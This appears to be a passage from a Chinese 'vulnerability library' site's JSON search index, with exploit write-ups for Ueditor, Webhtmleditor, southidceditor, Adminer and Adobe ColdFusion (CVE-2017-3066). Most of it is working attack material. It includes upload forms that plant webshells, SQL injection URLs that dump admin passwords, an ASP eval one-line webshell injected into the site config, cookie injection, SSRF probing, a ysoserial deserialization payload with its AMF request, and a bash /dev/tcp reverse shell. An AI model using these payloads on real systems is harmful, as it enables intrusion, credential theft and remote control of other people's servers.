/ueditor/jsp/controller.jsp?action=uploadimag</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"Ueditor\u7f16\u8f91\u5668.NET1.4.3.3\u7248\u672c\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd\uff1a","text":"<p>.NET 1.4.3.3\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A8.NET1.4.3.3%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC\uff1a","text":"<pre><code>&lt;form action=\"www.XXXX.com.cn/controller.ashx?action=catchimage\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\"&gt;\n&lt;p&gt;shell addr:&lt;input type=\"text\" name=\"source[]\"/&gt;&lt;/p&gt;\n&lt;input type=\"submit\" value=\"submit\"/&gt;\n&lt;/form&gt;\n</code></pre> <p>\u4fdd\u5b58\u4e3ahtml\u6587\u4ef6\uff0c\u6253\u5f00\u540e\u4e0a\u4f20\u6846\u8f93\u5165\u8fdc\u7a0b\u56fe\u7247\u9a6ctest.jpg\uff0c\u4e0a\u4f20\u65f6\u8def\u5f84\u6700\u540e\u6539\u4e3atest.jpg?.aspx</p> <p>\u8fd4\u56deshell\u8def\u5f84\u83dc\u5200\u8fde\u63a5\u5373\u53ef\uff01</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/","title":"Ueditor ssrf\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd\uff1a","text":"<p>v1.4.3</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u5b58\u5728\u6f0f\u6d1e\u8def\u5f84\uff1a</p> <p>http://localhost:8088/jsp/controller.jsp?action=catchimage&amp;source[]=http://192.168.135.133:8080/test.jpg</p> <p>\u53ef\u6839\u636e\u9875\u9762\u8fd4\u56de\u7684\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u8be5\u5730\u5740\u7aef\u53e3\u662f\u5426\u5f00\u653e\uff1a</p> <ol> <li>\u5982\u679c\u6293\u53d6\u4e0d\u5b58\u5728\u7684\u56fe\u7247\u5730\u5740\u65f6\uff0c\u9875\u9762\u8fd4\u56de{\"state\": \"SUCCESS\", list: [{\"state\":\"\\u8fdc\\u7a0b\\u8fde\\u63a5\\u51fa\\u9519\"} ]}\uff0c\u5373state\u4e3a\u201c\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519\u201d\u3002</li> <li>\u5982\u679c\u6210\u529f\u6293\u53d6\u5230\u56fe\u7247\uff0c\u9875\u9762\u8fd4\u56de{\"state\": \"SUCCESS\",  list: [{\"state\":  \"SUCCESS\",\"size\":\"5103\",\"source\":\"http://192.168.135.133:8080/tomcat.png\",\"title\":\"1527173588127099881.png\",\"url\":\"/ueditor/jsp/upload/image/20180524/1527173588127099881.png\"} ]}\uff0c\u5373state\u4e3a\u201cSUCCESS\u201d\u3002</li> <li>\u5982\u679c\u4e3b\u673a\u65e0\u6cd5\u8bbf\u95ee\uff0c\u9875\u9762\u8fd4\u56de{\"state\":\"SUCCESS\", list: [{\"state\": \"\\u6293\\u53d6\\u8fdc\\u7a0b\\u56fe\\u7247\\u5931\\u8d25\"}]}\uff0c\u5373state\u4e3a\u201c\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25\u201d\u3002</li> </ol> <p>\u7531\u4e8e\u9664\u4e86\u5728config.js\u4e2d\u7684catcherLocalDomain\u914d\u7f6e\u4e86\u8fc7\u6ee4\u7684\u5730\u5740\u5916\uff0c\u6ca1\u6709\u9488\u5bf9\u5185\u90e8\u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u8fd4\u56de\u7ed3\u679c\u7684\u4e0d\u540c\uff0c\u6765\u8fdb\u884c\u5185\u7f51\u7684\u63a2\u6d4b\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Webhtmleditor/webhtml%20editor%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"Webhtml editor \u89e3\u6790\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Webhtmleditor/webhtml%20editor%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#win-2003-iisshell","title":"\u5229\u7528WIN 2003 IIS\u6587\u4ef6\u540d\u79f0\u89e3\u6790\u6f0f\u6d1e\u83b7\u5f97SHELL","text":"<p>\u5f71\u54cd\u7248\u672c\uff1a&lt;= Webhtmleditor\u6700\u7ec8\u72481.7 (\u5df2\u505c\u6b62\u66f4\u65b0) \u8106\u5f31\u63cf\u8ff0/\u653b\u51fb\u5229\u7528\uff1a \u5bf9\u4e0a\u4f20\u7684\u56fe\u7247\u6216\u5176\u4ed6\u6587\u4ef6\u65e0\u91cd\u547d\u540d\u64cd\u4f5c\uff0c\u5bfc\u81f4\u5141\u8bb8\u6076\u610f\u7528\u6237\u4e0a\u4f20diy.asp;.jpg\u6765\u7ed5\u8fc7\u5bf9\u540e\u7f00\u540d\u5ba1\u67e5\u7684\u9650\u5236\uff0c\u5bf9\u4e8e\u6b64\u7c7b\u56e0\u7f16\u8f91\u5668\u4f5c\u8005\u610f\u8bc6\u72af\u4e0b\u7684\u9519\u8bef\uff0c\u5c31\u7b97\u906d\u9047\u7f29\u7565\u56fe\uff0c\u6587\u4ef6\u5934\u68c0\u6d4b\uff0c\u4e5f\u53ef\u4f7f\u7528\u56fe\u7247\u6728\u9a6c \u63d2\u5165\u4e00\u53e5\u8bdd\u6765\u7a81\u7834\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/%E5%8D%97%E6%96%B9%E6%95%B0%E6%8D%AEsouthidceditor/%E5%8D%97%E6%96%B9%E6%95%B0%E6%8D%AE%E7%BC%96%E8%BE%91%E5%99%A8/","title":"\u5357\u65b9\u6570\u636e\u7f16\u8f91\u5668southidceditor\u6ce8\u5165\u6f0f\u6d1e","text":"<p>\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\u8f83\u8001</p> <p>1.\u6ce8\u5165\u70b9:<code>news_search.asp?key=7%' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from  admin where 1 or '%'='&amp;otype=title&amp;Submit=%CB%D1%CB%F7</code>  \u76f4\u63a5\u66b4\u7ba1\u7406\u5458\u5e10\u53f7\u5bc6\u7801(md5)</p> <p>2.\u767b\u9646\u540e\u53f0</p> <p>3.\u5229\u7528\u7f16\u8f91\u5668\u4e0a\u4f20:</p> <p>\u8bbf\u95eeadmin/southidceditor/admin_style.asp</p> <p>\u4fee\u6539\u7f16\u8f91\u5668\u6837\u5f0f,\u589e\u52a0asa(\u4e0d\u8981asp).\u7136\u540e\u76f4\u63a5\u540e\u53f0\u7f16\u8f91\u65b0\u95fb\u4e0a\u4f20.</p> <p>========================================</p> <p>\u53c2\u8003\u8d44\u6599\u6574\u7406:</p> <p>1\u3001\u901a\u8fc7upfile_other.asp\u6f0f\u6d1e\u6587\u4ef6\u76f4\u63a5\u53d6SHELL</p> <p>\u76f4\u63a5\u6253\u5f00userreg.asp\u8fdb\u884c\u6ce8\u518c\u4f1a\u5458\uff0c\u8fdb\u884c\u767b\u5f55\uff0c\uff08\u5728\u672a\u9000\u51fa\u767b\u5f55\u7684\u72b6\u6001\u4e0b\uff09\u4f7f\u7528\u672c\u5730\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u4e0a\u4f20\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code> &lt;HTML&gt;&lt;HEAD&gt; &lt;META http-equiv=Content-Type content=\"text/html; charset=gb2312\"&gt; &lt;STYLE type=text/css&gt;BODY { FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee } .tx1 { BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid;  FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff;  BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px } &lt;/STYLE&gt;\n\n &lt;META content=\"MSHTML 6.00.2800.1400\" name=GENERATOR&gt;&lt;/HEAD&gt; &lt;BODY leftMargin=0 topMargin=0&gt; &lt;FORM name=form1 action=\"http://www.webshell.cc/upfile_Other.asp\"; method=post encType=multipart/form-data&gt;&lt;INPUT type=file size=30  name=FileName&gt; &lt;INPUT type=file size=30 name=FileName1&gt;  &lt;INPUT xxxxx=\"BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP:  rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt;  BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal;  BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal;  FONT-VARIANT: normal\" type=submit value=\u4e0a\u4f20 name=Submit&gt; &lt;INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID&gt; &lt;/FORM&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n</code></pre> <p>\u5c06\u4ee5\u4e0a\u4ee3\u7801\u4fdd\u5b58\u4e3ahtml\u683c\u5f0f\uff0c\u66ff\u6362\u4ee3\u7801\u4e2d\u7684\u7f51\u5740\uff0c\u7b2c\u4e00\u4e2a\u6846\u91cc\u9009\u62e9\u56fe\u7247\u6587\u4ef6\uff0c\u7b2c\u4e8c\u4e2a\u6846\u9009\u62e9.cer\u3001.asa\u6216asp\u6587\u4ef6\u4e0a\u4f20\uff08\u540e\u9762\u9700\u8981\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u8c8c\u4f3c\u5728IE8\u4e2d\u8fdb\u884c\u4f7f\u7528\u4e0d\u80fd\u540e\u9762\u52a0\u7a7a\u683c\uff0c\u52a0\u7a7a\u683c\u65f6\u5c31\u5f39\u51fa\u9009\u62e9\u6587\u4ef6\u5bf9\u8bdd\u6846\uff0c\u6211\u662f\u627e\u4e0d\u5230\u89e3\u51b3\u529e\u6cd5\uff09\u3002</p> <p>\u6ce8\uff1a\u6b64\u65b9\u6cd5\u901a\u6740\u5357\u65b9\u6570\u636e\u3001\u826f\u7cbe\u7cfb\u7edf\u3001\u7f51\u8f6f\u5929\u4e0b\u7b49</p> <p>2\u3001\u901a\u8fc7\u6ce8\u5165\u79d2\u6740\u7ba1\u7406\u5458\u5e10\u53f7\u5bc6\u7801\uff0c\u4f7f\u7528\u5982\u4e0b\uff1a</p> <p><code>http://******/NewsType.asp?SmallClass=\u2019%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20\u2019\u2019=\u2019</code></p> <p>\u4ee5\u4e0a\u4ee3\u7801\u76f4\u63a5\u66b4\u7ba1\u7406\u5458\u5e10\u53f7\u548c\u5bc6\u7801\uff0c\u53d6SHELL\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <p>\u5728\u7f51\u7ad9\u914d\u7f6e[http://******/admin/SiteConfig.asp]\u7684\u7248\u6743\u4fe1\u606f\u91cc\u5199\u5165<code>\"%&gt;&lt;%eval(request(chr(35)))%&gt;&lt;%\u2019</code>  \u6210\u529f\u628ashell\u5199\u5165http://******/inc/config.asp</p> <p>\u8fd9\u91cc\u4e00\u53e5\u8bddchr(32)\u5bc6\u7801\u662f\u201c#\u201d</p> <p>3\u3001cookie\u6ce8\u5165</p> <p>\u6e05\u7a7a\u5730\u5740\u680f\uff0c\u5229\u7528union\u8bed\u53e5\u6765\u6ce8\u5165\uff0c\u63d0\u4ea4\uff1a</p> <p><code>javascript:alert(document.cookie=\"id=\"+escape(\"1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin\"))</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","title":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 15:40:48</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Adminer&lt;=4.3.1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>POC</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/","title":"Adobe ColdFusion \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE 2017 3066\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#adobe-coldfusion-cve-2017-3066","title":"Adobe ColdFusion \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-3066\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>Adobe ColdFusion\u662f\u7f8e\u56fdAdobe\u516c\u53f8\u7684\u4e00\u6b3e\u52a8\u6001Web\u670d\u52a1\u5668\u4ea7\u54c1\uff0c\u5176\u8fd0\u884c\u7684CFML\uff08ColdFusion Markup Language\uff09\u662f\u9488\u5bf9Web\u5e94\u7528\u7684\u4e00\u79cd\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u3002</p> <p>Adobe  ColdFusion\u4e2d\u5b58\u5728java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6216\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\u4ee5\u4e0b\u7248\u672c\u53d7\u5230\u5f71\u54cd\uff1aAdobe ColdFusion (2016 release) Update 3\u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0cColdFusion 11 Update  11\u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0cColdFusion 10 Update 22\u53ca\u4e4b\u524d\u7684\u7248\u672c\u3002</p> <p>\u53c2\u8003\u94fe\u63a5\uff1a</p> <ul> <li>https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_2","title":"\u590d\u73b0\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_3","title":"\u542f\u52a8\u73af\u5883","text":"<p>\u8fdb\u5165\u8def\u5f84\u4e3a</p> <pre><code>cd /root/vulhub/coldfusion/CVE-2017-3066\n1\n</code></pre> <p>\u642d\u5efa\u53ca\u8fd0\u884c\u6f0f\u6d1e\u73af\u5883\uff1a</p> <pre><code>docker-compose build &amp;&amp; docker-compose up -d\n1\n</code></pre> <p>\u6b64\u672c\u5b89\u88c5\u73af\u5883\u9700\u8981\u5927\u69821G+\u7684\u6570\u636e\u4e0b\u8f7d\uff0c\u7f51\u7edc\u4e0d\u597d\u7684\u8d77\u6765\u8d70\u52a8\u8d70\u52a8\u5427:)   \u73af\u5883\u542f\u52a8\u6210\u529f\u540e\uff0c\u8bbf\u95ee<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>\uff0c\u8f93\u5165\u5bc6\u7801<code>vulhub</code>\uff0c\u5373\u53ef\u6210\u529f\u5b89\u88c5Adobe ColdFusion\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc","title":"\u751f\u6210POC","text":"<p>\u4f7f\u7528ColdFusionPwn\u5de5\u5177\u6765\u751f\u6210POC\u3002  \u4e0b\u8f7dColdFusionPwn \u4e0b\u8f7dysoserial  \u3010\u6ce8\u610f\u3011\u4e0b\u8f7d\u7684jar\u5305\u53ef\u80fd\u56e0\u4e3a\u65f6\u95f4\u4e0d\u540c\uff0c\u800c\u66f4\u65b0\uff0c\u5305\u540d\u4e5f\u5c31\u4e0d\u540c\u3002\u6ce8\u610f\u5c06\u547d\u4ee4\u4e2d\u7684\u5305\u540d\uff0c\u66ff\u6362\u4e3a\u4f60\u4e0b\u8f7d\u65f6\u5019\u7684\u540d\u5b57</p> <pre><code>java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/CVE-2017-3066_is_success' poc.ser\n1\n</code></pre> <p>\u3010\u518d\u6ce8\u610f\u3011\u4e0a\u9762\u7684\u547d\u4ee4\u5728Win10\u4e0b\u6211\u6ca1\u6709\u6267\u884c\u6210\u529f\uff0c\u9519\u8bef\u63d0\u793a\u4e3a<code>\u9519\u8bef: \u627e\u4e0d\u5230\u6216\u65e0\u6cd5\u52a0\u8f7d\u4e3b\u7c7b com.codewhitesec.coldfusionpwn.ColdFusionPwner</code>\u3002\u5728Kali\u6210\u529f\u751f\u6210\u4e86?</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc_1","title":"\u53d1\u9001POC","text":"<p>\u751f\u6210poc.ser\u6587\u4ef6\u540e\uff0c\u5c06POC\u4f5c\u4e3a\u6570\u636e\u5305body\u53d1\u9001\u7ed9<code>http://your-ip:8500/flex2gateway/amf</code>\uff0cContent-Type\u4e3a<code>application/x-amf</code>\uff1a</p> <pre><code>POST /flex2gateway/amf HTTP/1.1\nHost: your-ip:8500\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-amf\nContent-Length: 2853\n\n[...poc...]\n1234567891011\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc_2","title":"\u53d1\u9001POC\u5185\u5bb9","text":"<p>\u7531\u4e8e\u7f16\u7801\u95ee\u9898\uff0c\u5982\u679c\u76f4\u63a5\u4eceNotepad++/Notepad\u91cc\u9762\u590d\u5236\u7c98\u8d34\u4e3abody\u90e8\u5206\uff0c\u662f\u4e0d\u6210\u529f\u7684\uff0c\u5373\u4f7f\u8fd4\u56de\u7684\u72b6\u6001\u7801\u662f200   \u6b63\u786e\u53d1\u9001\u65b9\u5f0f\u4e3a\uff1a  \u53f3\u51fb\u9009\u62e9**Paste From File**\uff0c\u4e0a\u4f20**poc.cer**\u6587\u4ef6  </p> <p>\u3010\u611f\u8c22\u8c46\u8001\u5e08?\u7684\u7ea0\u9519\uff0c\u4ee5\u53ca\u79d1\u666e\u7f16\u7801\u95ee\u9898\u3011?  \u518d\u5230<code>Raw</code>\u754c\u9762\u6dfb\u52a0HTTP\u5934\u90e8\uff0c\u5982\u679c\u6210\u529f\uff0c\u5e76\u4e14\u6253\u7b97\u4ee5\u540e\u8fd8\u9700\u8981\u7528\u7684\u8bdd\uff0c\u53f3\u51fb\u9009\u62e9<code>Copy to File</code>\u4fdd\u5b58 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc_3","title":"\u68c0\u9a8cPOC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_5","title":"\u8fdb\u5165\u5bb9\u5668","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#dockerid","title":"\u901a\u8fc7DockerID\u8fdb\u5165\u5bb9\u5668","text":"<pre><code>docker exec -it \u5bb9\u5668ID /bin/bash  \n1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#id","title":"\u67e5\u770b\u5bb9\u5668ID","text":"<pre><code>docker ps\n1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#docker","title":"\u901a\u8fc7Docker\u540d\u5b57\u8fdb\u5165\u5bb9\u5668","text":"<pre><code>docker-compose exec \u5bb9\u5668\u540d\u5b57 bash\n1\n</code></pre> <p>\u6bd4\u5982\u672c\u6b21\u73af\u5883\u4e2d\u662f\uff1a</p> <pre><code>docker-compose exec coldfusion bash\n1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#tmp","title":"\u67e5\u770b/tmp/","text":"<pre><code>ls /tmp/\n1\n</code></pre> <p>\u53d1\u73b0<code>/tmp/success</code>\u5df2\u6210\u529f\u521b\u5efa\uff1a   \u5c06POC\u6539\u6210\u53cd\u5f39\u547d\u4ee4\uff0c\u6210\u529f\u62ff\u5230shell\uff1a </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#shell","title":"\u53cd\u5f39Shell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_6","title":"\u683c\u5f0f","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_7","title":"\u4f8b\u5b50","text":"<p>\u6bd4\u5982\u76d1\u542c192.168.236.138\u7684333\u7aef\u53e3</p> <pre><code>bash -i &gt;&amp; /dev/tcp/192.168.236.138/333 